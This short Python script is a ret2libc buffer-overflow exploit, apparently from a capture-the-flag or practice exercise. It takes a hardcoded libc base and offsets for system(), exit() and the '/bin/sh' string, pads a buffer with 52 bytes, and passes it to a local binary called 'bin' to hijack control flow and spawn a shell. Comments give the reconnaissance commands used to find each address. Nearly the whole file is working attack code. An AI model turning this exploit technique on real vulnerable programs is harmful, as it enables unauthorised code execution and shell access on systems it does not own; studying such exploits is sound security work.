import struct
from subprocess import call

#ldd bin | grep libc
libc_base = 0xb7e19000

#readelf -s /lib/i386-linux-gnu/libc.so.6| grep system
#choose system of libc
system_offset = 0x0003ada0

#readelf -s /lib/i386-linux-gnu/libc.so.6| grep exit
#choose exit of libc
exit_offset = 0x0002e9d0

#strings -a -t x /lib/i386-linux-gnu/libc.so.6| grep /bin/sh
shell_offset = 0x0015ba0b

system = struct.pack("<I", libc_base + system_offset)

exit = struct.pack("<I", libc_base + exit_offset)

shell=struct.pack("<I", libc_base + shell_offset)

# find exploit point:
  # generate_pattern
  # debug with the patern
  # offset_pattern with the address
buf = 'A' * 52
buf += system
buf += exit
buf += shell

call(["bin", buf])
